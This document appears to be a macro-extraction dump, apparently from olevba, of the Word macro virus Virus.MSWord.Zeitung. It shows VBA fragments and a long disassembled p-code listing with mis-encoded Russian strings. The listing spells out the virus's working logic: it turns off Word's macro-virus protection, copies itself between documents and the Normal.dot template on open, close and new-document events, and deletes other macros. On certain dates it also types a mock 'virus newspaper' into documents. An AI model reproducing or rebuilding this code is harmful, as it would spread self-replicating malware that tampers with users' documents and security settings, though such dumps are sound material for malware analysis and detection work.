   Case 20
    Artikel_3$ = "- Äî ñâèäàíèÿ."
   Case Else
    Artikel_3$ = ""
  End Select
 End If
 If T = 3 Then
  Artikel_3$ = "Áåñåäó ïðîâîäèë íàø êîððåñïîíäåíò  Ì. Â. ×óðèëîâ"
 End If
End Function












-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Zeitung
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 33206 bytes
' Line #0:
' 	Dim (Const) 
' 	LitStr 0x000C "VirusZeitung"
' 	VarDefn E_Marker
' 	QuoteRem 0x0020 0x0010 "ñèãíàòóðà âèðóñà"
' Line #1:
' 	QuoteRem 0x0000 0x0047 "èó îäë:ÀêäéÔíðâêé ëêàä ôåî  èàëØòëâ@Âðññçàè ðàè èàåñè,ÀåñíðÅðìâèÌõè ààî"
' Line #2:
' 	QuoteRem 0x0000 0x0001 "1"
' Line #3:
' 	QuoteRem 0x0000 0x0013 "íîìåð 1 çà 2000 ãîä"
' Line #4:
' 	Dim 
' 	VarDefn ad
' 	VarDefn nt (As Object)
' Line #5:
' 	Dim 
' 	VarDefn sd
' 	VarDefn snt (As Boolean)
' Line #6:
' Line #7:
' 	FuncDefn (Private Function NormalKontam(id_FFFE As Variant))
' Line #8:
' 	Ld E_Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	IfBlock 
' Line #9:
' 	LitDI2 0x0000 
' 	St NormalKontam 
' Line #10:
' 	ElseBlock 
' Line #11:
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0003 
' 	Lt 
' 	IfBlock 
' Line #12:
' 	LitDI2 0x0000 
' 	St NormalKontam 
' Line #13:
' 	ElseBlock 
' Line #14:
' 	LitDI2 0x0003 
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	St ant$ 
' Line #15:
' 	Ld ant$ 
' 	LitDI2 0x0002 
' 	Ld ant$ 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St ant$ 
' Line #16:
' 	Ld ant$ 
' 	ArgsLd Trim 0x0001 
' 	ArgsLd Val 0x0001 
' 	LitDI4 0xFFFF 0x0000 
' 	Lt 
' 	IfBlock 
' Line #17:
' 	Ld ant$ 
' 	ArgsLd Trim 0x0001 
' 	ArgsLd Val 0x0001 
' 	St NormalKontam 
' Line #18:
' 	ElseBlock 
' Line #19:
' 	LitDI2 0x0001 
' 	UMi 
' 	St NormalKontam 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	EndIfBlock 
' Line #23:
' 	EndFunc 
' Line #24:
' Line #25:
' 	FuncDefn (Private Function ADokumKontam(id_FFFE As Variant))
' Line #26:
' 	Ld E_Marker 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x2710 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd Find 0x0005 
' 	Not 
' 	IfBlock 
' Line #27:
' 	LitDI2 0x0000 
' 	St ADokumKontam 
' Line #28:
' 	ElseBlock 
' Line #29:
' 	Ld ad 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0003 
' 	Lt 
' 	IfBlock 
' Line #30:
' 	LitDI2 0x0000 
' 	St ADokumKontam 
' Line #31:
' 	ElseBlock 
' Line #32:
' 	LitDI2 0x0003 
' 	Ld ad 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	ArgsLd Trim 0x0001 
' 	St ant$ 
' Line #33:
' 	Ld ant$ 
' 	LitDI2 0x0002 
' 	Ld ant$ 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	St ant$ 
' Line #34:
' 	Ld ant$ 
' 	ArgsLd Trim 0x0001 
' 	ArgsLd Val 0x0001 
' 	LitDI4 0xFFFF 0x0000 
' 	Lt 
' 	IfBlock 
' Line #35:
' 	Ld ant$ 
' 	ArgsLd Trim 0x0001 
' 	ArgsLd Val 0x0001 
' 	St ADokumKontam 
' Line #36:
' 	ElseBlock 
' Line #37:
' 	LitDI2 0x0001 
' 	UMi 
' 	St ADokumKontam 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	EndFunc 
' Line #42:
' Line #43:
' 	FuncDefn (Private Sub VirusArbeit())
' Line #44:
' 	OnError (Resume Next) 
' Line #45:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #46:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set nt 
' Line #47:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ad 
' Line #48:
' 	Ld ADokumKontam 
' 	Ld NormalKontam 
' 	Lt 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Paren 
' 	Or 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #49:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St sd 
' Line #50:
' 	Ld ad 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #51:
' 	LitStr 0x0003 "C:\"
' 	Ld ActiveDocument 
' 	MemLd ActiveWindow 
' 	MemLd Caption 
' 	Add 
' 	LitStr 0x0004 ".TXT"
' 	Add 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002F "Ìàêðîñû, áûâøèå â äîêóìåíòå äî âíåäðåíèÿ âèðóñà"
' 	PrintItemNL 
' Line #53:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codumodule 
' 	MemLd countoflines 
' 	For 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	PrintItemNL 
' Line #55:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	NextVar 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #57:
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #58:
' 	EndIfBlock 
' Line #59:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	For 
' Line #60:
' 	Ld v 
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemCall insertlines 0x0002 
' Line #61:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	NextVar 
' Line #62:
' 	Ld sd 
' 	LitVarSpecial (True)
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd ActiveWindow 
' 	MemLd Caption 
' 	LitDI2 0x0001 
' 	LitDI2 0x0008 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0008 "Äîêóìåíò"
' 	Ne 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #63:
' 	EndIfBlock 
' Line #64:
' Line #65:
' 	Ld ADokumKontam 
' 	Ld NormalKontam 
' 	Gt 
' 	IfBlock 
' Line #66:
' 	Ld NormalTemplate 
' 	MemLd Saved 
' 	St snt 
' Line #67:
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #68:
' 	LitStr 0x000D "C:\NORMAL.TXT"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0024 "Ìàêðîñû, áûâøèå â øàáëîíå Normal.dot"
' 	PrintItemNL 
' Line #70:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	For 
' Line #71:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	PrintItemNL 
' Line #72:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	NextVar 
' Line #73:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #74:
' 	LitDI2 0x0001 
' 	Ld nt 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall deletelines 0x0002 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	MemLd countoflines 
' 	For 
' Line #77:
' 	Ld v 
' 	Ld v 
' 	LitDI2 0x0001 
' 	Ld ad 
' 	MemLd codemodule 
' 	ArgsMemLd lines 0x0002 
' 	Ld nt 
' 	MemLd codemodule 
' 	ArgsMemCall insertlines 0x0002 
' Line #78:
' 	StartForVariable 
' 	Ld v 
' 	EndForVariable 
' 	NextVar 
' Line #79:
' 	Ld snt 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #80:
' 	EndIfBlock 
' Line #81:
' 	SetStmt 
' 	LitNothing 
' 	Set nt 
' Line #82:
' 	SetStmt 
' 	LitNothing 
' 	Set ad 
' Line #83:
' 	EndSub 
' Line #84:
' Line #85:
' 	FuncDefn (Private Sub HauptArbeit(p))
' Line #86:
' 	LitStr 0x0000 ""
' 	St Tag$ 
' Line #87:
' 	LitStr 0x0000 ""
' 	St Monat$ 
' Line #88:
' 	Ld Date 
' 	ArgsLd Trim 0x0001 
' 	St datum$ 
' Line #89:
' 	LitDI2 0x0001 
' 	St i 
' Line #90:
' 	Ld datum$ 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld i 
' 	Ld datum$ 
' 	FnLen 
' 	Lt 
' 	Paren 
' 	And 
' 	While 
' Line #91:
' 	Ld Tag$ 
' 	Ld datum$ 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St Tag$ 
' Line #92:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #93:
' 	Wend 
' Line #94:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #95:
' 	Ld datum$ 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "."
' 	Ne 
' 	Paren 
' 	Ld i 
' 	Ld datum$ 
' 	FnLen 
' 	Lt 
' 	Paren 
' 	And 
' 	While 
' Line #96:
' 	Ld Monat$ 
' 	Ld datum$ 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St Monat$ 
' Line #97:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #98:
' 	Wend 
' Line #99:
' Line #100:
' 	Ld Monat$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	Ld Tag$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #101:
' 	LitDI2 0x0002 
' 	St p 
' Line #102:
' 	EndIfBlock 
' Line #103:
' 	Ld Monat$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0003 
' 	Eq 
' 	Paren 
' 	Ld Tag$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0015 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #104:
' 	LitDI2 0x0002 
' 	St p 
' Line #105:
' 	EndIfBlock 
' Line #106:
' 	Ld Monat$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0004 
' 	Eq 
' 	Paren 
' 	Ld Tag$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x001E 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #107:
' 	LitDI2 0x0002 
' 	St p 
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	Ld Monat$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	Paren 
' 	Ld Tag$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0015 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #110:
' 	LitDI2 0x0002 
' 	St p 
' Line #111:
' 	EndIfBlock 
' Line #112:
' 	Ld Monat$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0008 
' 	Eq 
' 	Paren 
' 	Ld Tag$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0002 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #113:
' 	LitDI2 0x0002 
' 	St p 
' Line #114:
' 	EndIfBlock 
' Line #115:
' 	Ld Monat$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0009 
' 	Eq 
' 	Paren 
' 	Ld Tag$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0015 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #116:
' 	LitDI2 0x0002 
' 	St p 
' Line #117:
' 	EndIfBlock 
' Line #118:
' 	Ld Monat$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	Paren 
' 	Ld Tag$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x001F 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #119:
' 	LitDI2 0x0002 
' 	St p 
' Line #120:
' 	EndIfBlock 
' Line #121:
' 	Ld Monat$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x000C 
' 	Eq 
' 	Paren 
' 	Ld Tag$ 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0015 
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #122:
' 	LitDI2 0x0002 
' 	St p 
' Line #123:
' 	EndIfBlock 
' Line #124:
' Line #125:
' 	Ld Rnd 
' 	Ld p 
' 	Ge 
' 	IfBlock 
' Line #126:
' 	ExitSub 
' Line #127:
' 	EndIfBlock 
' Line #128:
' 	ArgsCall Z_Kopf 0x0000 
' Line #129:
' Line #130:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	ArgsLd Artikel_1$ 0x0002 
' 	LitDI2 0x0012 
' 	LitVarSpecial (True)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #131:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #132:
' 	LitDI2 0x0000 
' 	St ab_ 
' Line #133:
' 	LitDI2 0x0002 
' 	Ld ab_ 
' 	ArgsLd Artikel_1$ 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	While 
' Line #134:
' 	LitDI2 0x0002 
' 	Ld ab_ 
' 	ArgsLd Artikel_1$ 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphJustify 
' 	LitR8 0x0000 0x0000 0x0000 0x3FF8 
' 	ArgsCall Druck_0 0x0005 
' Line #135:
' 	Ld ab_ 
' 	LitDI2 0x0001 
' 	Add 
' 	St ab_ 
' Line #136:
' 	Wend 
' Line #137:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #138:
' 	LitDI2 0x0003 
' 	LitDI2 0x0000 
' 	ArgsLd Artikel_1$ 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (True)
' 	Ld wdAlignParagraphRight 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #139:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #140:
' Line #141:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	ArgsLd Artikel_2$ 0x0002 
' 	LitDI2 0x0012 
' 	LitVarSpecial (True)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #142:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #143:
' 	LitDI2 0x0000 
' 	St ab_ 
' Line #144:
' 	LitDI2 0x0002 
' 	Ld ab_ 
' 	ArgsLd Artikel_2$ 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	While 
' Line #145:
' 	LitDI2 0x0002 
' 	Ld ab_ 
' 	ArgsLd Artikel_2$ 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphJustify 
' 	LitR8 0x0000 0x0000 0x0000 0x3FF8 
' 	ArgsCall Druck_0 0x0005 
' Line #146:
' 	Ld ab_ 
' 	LitDI2 0x0001 
' 	Add 
' 	St ab_ 
' Line #147:
' 	Wend 
' Line #148:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #149:
' 	LitDI2 0x0003 
' 	LitDI2 0x0000 
' 	ArgsLd Artikel_2$ 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (True)
' 	Ld wdAlignParagraphRight 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #150:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #151:
' Line #152:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	ArgsLd Artikel_3$ 0x0002 
' 	LitDI2 0x0012 
' 	LitVarSpecial (True)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #153:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #154:
' 	LitDI2 0x0000 
' 	St ab_ 
' Line #155:
' 	LitDI2 0x0002 
' 	Ld ab_ 
' 	ArgsLd Artikel_3$ 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	While 
' Line #156:
' 	LitDI2 0x0002 
' 	Ld ab_ 
' 	ArgsLd Artikel_3$ 0x0002 
' 	LitDI2 0x000E 
' 	Ld ab_ 
' 	LitDI2 0x0002 
' 	Div 
' 	Ld ab_ 
' 	LitDI2 0x0002 
' 	Div 
' 	FnInt 
' 	Ne 
' 	Ld wdAlignParagraphJustify 
' 	LitR8 0x0000 0x0000 0x0000 0x3FF8 
' 	ArgsCall Druck_0 0x0005 
' Line #157:
' 	Ld ab_ 
' 	LitDI2 0x0001 
' 	Add 
' 	St ab_ 
' Line #158:
' 	Wend 
' Line #159:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #160:
' 	LitDI2 0x0003 
' 	LitDI2 0x0000 
' 	ArgsLd Artikel_3$ 0x0002 
' 	LitDI2 0x000E 
' 	LitVarSpecial (True)
' 	Ld wdAlignParagraphRight 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #161:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #162:
' Line #163:
' 	ArgsCall Z_Sub 0x0000 
' Line #164:
' 	EndSub 
' Line #165:
' Line #166:
' 	FuncDefn (Private Sub Document_Close())
' Line #167:
' 	ArgsCall VirusArbeit 0x0000 
' Line #168:
' 	LitR8 0x999A 0x9999 0x9999 0x3FB9 
' 	Paren 
' 	ArgsCall HauptArbeit 0x0001 
' Line #169:
' 	EndSub 
' Line #170:
' Line #171:
' 	FuncDefn (Private Sub Document_New())
' Line #172:
' 	ArgsCall VirusArbeit 0x0000 
' Line #173:
' 	LitR8 0x999A 0x9999 0x9999 0x3FB9 
' 	Paren 
' 	ArgsCall HauptArbeit 0x0001 
' Line #174:
' 	EndSub 
' Line #175:
' Line #176:
' 	FuncDefn (Private Sub Document_Open())
' Line #177:
' 	ArgsCall VirusArbeit 0x0000 
' Line #178:
' 	LitR8 0x999A 0x9999 0x9999 0x3FB9 
' 	Paren 
' 	ArgsCall HauptArbeit 0x0001 
' Line #179:
' 	EndSub 
' Line #180:
' Line #181:
' 	FuncDefn (Private Sub Z_Kopf())
' Line #182:
' 	LitStr 0x0017 "À Ä Ñ Ê È É   Î Ã Î Í Ü"
' 	LitDI2 0x0028 
' 	LitVarSpecial (True)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #183:
' 	LitStr 0x002C "Âèðóñíàÿ ãàçåòà ñåêòû èì. Äæ. Äè è Ý. Êåëëè."
' 	LitDI2 0x0012 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphLeft 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #184:
' 	LitStr 0x0023 "Âûõîä ïî ìåðå êîìïëåêòîâàíèÿ íîìåðà"
' 	LitDI2 0x0012 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphLeft 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #185:
' 	LitStr 0x001D "5  ÿíâàðÿ  2000  ã.   ¹ 1 (1)"
' 	LitDI2 0x0012 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphLeft 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #186:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #187:
' 	LitStr 0x0011 "Ñåãîäíÿ â íîìåðå:"
' 	LitDI2 0x0012 
' 	LitVarSpecial (True)
' 	Ld wdAlignParagraphLeft 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #188:
' 	LitStr 0x0002 "* "
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	ArgsLd Artikel_1$ 0x0002 
' 	Add 
' 	LitDI2 0x0012 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphLeft 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #189:
' 	LitStr 0x0002 "* "
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	ArgsLd Artikel_2$ 0x0002 
' 	Add 
' 	LitDI2 0x0012 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphLeft 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #190:
' 	LitStr 0x0002 "* "
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	ArgsLd Artikel_3$ 0x0002 
' 	Add 
' 	LitDI2 0x0012 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphLeft 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #191:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #192:
' 	LitStr 0x001E "******************************"
' 	LitDI2 0x0012 
' 	LitVarSpecial (True)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #193:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #194:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #195:
' 	EndSub 
' Line #196:
' Line #197:
' 	FuncDefn (Private Sub Z_Sub())
' Line #198:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #199:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #200:
' 	LitStr 0x0025 "*************************************"
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #201:
' 	LitStr 0x003D "Ó÷ðåäèòåëü - ñàòàíèíñêàÿ ñåêòà èìåíè Äæîíà Äè è Ýäâàðäà Êåëëè"
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #202:
' 	LitStr 0x0021 "Ãëàâíûé ðåäàêòîð - Â. Ä. Òàðàñêèí"
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #203:
' 	LitStr 0x0018 "Äèðåêòîð - Ã. Ñ. Ëèñóíîâ"
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #204:
' 	LitStr 0x0019 "Àâòîð èäåè - À. Í. Ãåíîâà"
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #205:
' 	LitStr 0x0032 "Êîíñóëüòàíò ïî âîïðîñàì âèðóñîëîãèè -  Ï. Â. Íîãèí"
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #206:
' 	LitStr 0x0021 "Ãëàâíûé ïðîãðàììèñò - À. Â. Ðûæîâ"
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #207:
' 	LitStr 0x002E "Êîìïüþòåðíûé íàáîð è îôîðìëåíèå - Ò. Â. Çóáîâà"
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #208:
' 	LitStr 0x0041 "Ìíåíèå ðåäàêöèè ìîæåò íå ñîâïàäàòü ñ ïîçèöèåé àâòîðîâ ïóáëèêàöèé."
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #209:
' 	LitStr 0x004A "Ïðè ïåðåïå÷àòêå è èñïîëüçîâàíèè ìàòåðèàëîâ ññûëêà íà ãàçåòó íåîáÿçàòåëüíà."
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #210:
' 	LitStr 0x0047 "Ðåäàêöèÿ íå íåñåò îòâåòñòâåííîñòè çà ñîäåðæàíèå ïóáëèêóåìûõ ìàòåðèàëîâ."
' 	LitDI2 0x000E 
' 	LitVarSpecial (False)
' 	Ld wdAlignParagraphCenter 
' 	LitDI2 0x0000 
' 	ArgsCall Druck_0 0x0005 
' Line #211:
' 	EndSub 
' Line #212:
' Line #213:
' 	FuncDefn (Private Sub Druck_0(T As String, Siz, Bld, Alg, Ind))
' Line #214:
' 	Ld Siz 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Size 
' Line #215:
' 	Ld Bld 
' 	Ld Selection 
' 	MemLd Font 
' 	MemSt Bold 
' Line #216:
' 	Ld Alg 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt Alignment 
' Line #217:
' 	Ld Ind 
' 	ArgsLd CentimetersToPoints 0x0001 
' 	Ld Selection 
' 	MemLd ParagraphFormat 
' 	MemSt FirstLineIndent 
' Line #218:
' 	Ld Selection 
' 	ArgsMemCall TypeParagraph 0x0000 
' Line #219:
' 	Ld T 
' 	ParamNamed Then 
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' Line #220:
' 	EndSub 
' Line #221:
' Line #222:
' 	FuncDefn (Private Function Artikel_1(T, Ab, id_FFFE As String))
' Line #223:
' 	Ld T 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #224:
